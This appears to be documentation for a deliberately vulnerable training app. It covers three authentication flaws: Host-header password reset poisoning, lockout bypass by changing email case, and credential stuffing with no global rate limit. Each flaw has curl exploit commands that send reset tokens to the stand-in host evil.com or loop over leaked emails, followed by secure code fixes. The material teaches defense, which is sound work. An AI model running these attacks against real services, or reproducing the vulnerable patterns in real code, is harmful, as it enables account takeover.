# Additional Authentication Bypass Vulnerabilities

> [!WARNING]
> **HIGH SEVERITY VULNERABILITIES** - For educational/testing purposes only.

## Overview

Implemented **3 additional authentication bypass techniques** based on OWASP guidelines, PortSwigger research, and bug bounty reports. These demonstrate common authentication flaws beyond JWT and session management.

---

## Vulnerabilities

### 1. Password Reset Poisoning (Host Header Injection)

**Severity**: Critical  
**Source**: OWASP, HackerOne, PortSwigger

**Vulnerability**: Password reset link uses the `Host` header to construct the reset URL, allowing attackers to inject their own domain and steal reset tokens.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `forgotPasswordHostInjection()`

**How It Works**:
1. Attacker intercepts password reset request
2. Attacker modifies `Host` header to their domain (evil.com)
3. Server generates reset link using attacker's domain
4. Victim receives email with link to evil.com
5. Victim clicks link, attacker steals reset token

**Exploit**:
```bash
# 1. Attacker sends password reset request with modified Host header
curl -X POST http://localhost:3000/api/jwt-session/forgot-password-host-injection \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# Server response includes poisoned link:
# {
#   "resetLink": "http://evil.com/reset-password?token=abc123...",
#   "vulnerability": "Host header injection"
# }

# 2. Victim receives email with link to evil.com
# 3. Victim clicks: http://evil.com/reset-password?token=abc123...
# 4. Attacker's server (evil.com) captures the token
# 5. Attacker uses token to reset victim's password

curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","token":"abc123...","newPassword":"hacked"}'

# SUCCESS - Account takeover!
```

**Alternative Attack Vectors**:
```bash
# Using X-Forwarded-Host header
curl -X POST http://localhost:3000/api/jwt-session/forgot-password-host-injection \
  -H "X-Forwarded-Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# Using X-Host header
curl -X POST http://localhost:3000/api/jwt-session/forgot-password-host-injection \
  -H "X-Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'
```

**Impact**: Account takeover, password reset token theft.

**Secure Implementation**:
```typescript
export const forgotPasswordSecure = async (req: Request, res: Response) => {
    const { email } = req.body;
    
    // ... user lookup and token generation ...
    
    // NEVER use Host header - use configured domain
    const TRUSTED_DOMAIN = process.env.APP_DOMAIN || 'app.example.com';
    const resetLink = `https://${TRUSTED_DOMAIN}/reset-password?token=${resetToken}`;
    
    // Or validate Host header against whitelist
    const allowedHosts = ['app.example.com', 'www.example.com'];
    const host = req.headers.host;
    if (!allowedHosts.includes(host)) {
        return res.status(400).json({ message: 'Invalid host' });
    }
    
    // Send email with trusted link
    await sendEmail(email, resetLink);
    
    res.json({ message: 'Reset link sent' });
};
```

---

### 2. Account Lockout Bypass via Case Sensitivity

**Severity**: Medium  
**Source**: OWASP, Bug Bounty Reports

**Vulnerability**: Account lockout mechanism tracks failed attempts using case-sensitive email, but user lookup is case-insensitive. Attacker can bypass lockout by changing email case.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `loginCaseSensitiveLockout()`

**Exploit**:
```bash
# 1. Try to brute-force with lowercase email
for i in {1..5}; do
  curl -X POST http://localhost:3000/api/jwt-session/login-case-sensitive-lockout \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"wrong'$i'"}'
done

# Response after 5 attempts: "Account locked"

# 2. Bypass lockout by changing case
curl -X POST http://localhost:3000/api/jwt-session/login-case-sensitive-lockout \
  -H "Content-Type: application/json" \
  -d '{"email":"VICTIM@test.com","password":"brute6"}'

# SUCCESS - Lockout bypassed! Can continue brute-forcing

# 3. Continue with different case variations
curl -X POST http://localhost:3000/api/jwt-session/login-case-sensitive-lockout \
  -H "Content-Type: application/json" \
  -d '{"email":"Victim@test.com","password":"brute7"}'

# Each case variation gets 5 more attempts!
```

**Impact**: Brute-force protection bypass, account compromise.

**Secure Implementation**:
```typescript
const loginAttempts: { [email: string]: number } = {};

export const loginSecure = async (req: Request, res: Response) => {
    const { email, password } = req.body;
    
    // Normalize email for lockout tracking
    const normalizedEmail = email.toLowerCase().trim();
    
    // Check lockout using normalized email
    if (loginAttempts[normalizedEmail] >= 5) {
        return res.status(429).json({ message: 'Account locked' });
    }
    
    // User lookup also uses normalized email
    const user = await prisma.user.findUnique({ 
        where: { email: normalizedEmail } 
    });
    
    if (!user || !await bcrypt.compare(password, user.password)) {
        loginAttempts[normalizedEmail] = (loginAttempts[normalizedEmail] || 0) + 1;
        return res.status(401).json({ message: 'Invalid credentials' });
    }
    
    // ... success logic ...
};
```

---

### 3. Credential Stuffing (No Global Rate Limiting)

**Severity**: High  
**Source**: OWASP, HackerOne

**Vulnerability**: Rate limiting is applied per account, but not globally. Attacker can test leaked credentials against thousands of accounts without triggering rate limits.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `loginNoGlobalRateLimit()`

**Exploit**:
```bash
# Scenario: Attacker has leaked password database from another site
# Common password: "Password123"

# 1. Test against many accounts (credential stuffing)
for email in $(cat leaked_emails.txt); do
  curl -X POST http://localhost:3000/api/jwt-session/login-no-global-limit \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"Password123\"}"
done

# Each account gets 5 attempts before lockout
# But attacker can test THOUSANDS of different accounts
# No global rate limit to stop the attack!

# 2. Successful logins are captured
# Attacker gains access to accounts using password reuse
```

**Impact**: 
- Mass account compromise
- Password reuse exploitation
- Credential stuffing attacks

**Secure Implementation**:
```typescript
const perAccountAttempts: { [email: string]: number } = {};
const globalAttempts: { [ip: string]: number } = {};

export const loginSecure = async (req: Request, res: Response) => {
    const { email, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    
    // Global rate limit per IP
    if (globalAttempts[ip] >= 20) {
        return res.status(429).json({ 
            message: 'Too many login attempts from this IP' 
        });
    }
    
    // Per-account rate limit
    if (perAccountAttempts[email] >= 5) {
        return res.status(429).json({ 
            message: 'Account temporarily locked' 
        });
    }
    
    const user = await prisma.user.findUnique({ where: { email } });
    
    if (!user || !await bcrypt.compare(password, user.password)) {
        perAccountAttempts[email] = (perAccountAttempts[email] || 0) + 1;
        globalAttempts[ip] = (globalAttempts[ip] || 0) + 1;
        return res.status(401).json({ message: 'Invalid credentials' });
    }
    
    // ... success logic ...
};
```

**Additional Protections**:
```typescript
// Use CAPTCHA after N failed attempts
if (globalAttempts[ip] >= 10) {
    // Require CAPTCHA
}

// Implement exponential backoff
const delay = Math.min(1000 * Math.pow(2, globalAttempts[ip]), 30000);
await new Promise(resolve => setTimeout(resolve, delay));

// Use device fingerprinting
// Monitor for distributed attacks (multiple IPs)
// Implement IP reputation checking
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/jwt-session/forgot-password-host-injection` | POST | Host header injection |
| `/api/jwt-session/login-case-sensitive-lockout` | POST | Case-sensitive lockout bypass |
| `/api/jwt-session/login-no-global-limit` | POST | No global rate limiting |

---

## Testing Checklist

- [ ] Test host header injection with evil.com
- [ ] Test X-Forwarded-Host injection
- [ ] Test case-sensitive lockout bypass
- [ ] Test credential stuffing with multiple accounts
- [ ] Verify global rate limits are missing

---

## Secure Authentication Best Practices

### Password Reset Security
1. **Use configured domain** - Never trust Host header
2. **Validate headers** - Whitelist allowed hosts
3. **Short-lived tokens** - 15-30 minute expiration
4. **One-time use** - Invalidate after use
5. **Rate limit requests** - Prevent token generation spam

### Rate Limiting
1. **Multi-layer approach** - Per-account AND global limits
2. **IP-based limiting** - Track attempts per IP
3. **Progressive delays** - Exponential backoff
4. **CAPTCHA integration** - After threshold reached
5. **Device fingerprinting** - Additional tracking

### Account Lockout
1. **Case-insensitive tracking** - Normalize emails
2. **Time-based unlocking** - Auto-unlock after period
3. **Notification** - Alert user of lockout
4. **Admin override** - Support can unlock
5. **Consistent enforcement** - All auth methods

---

## References

- [OWASP Password Reset Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [PortSwigger Host Header Attacks](https://portswigger.net/web-security/host-header)
- [OWASP Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
- [HackerOne Password Reset Reports](https://hackerone.com/reports?q=password+reset)
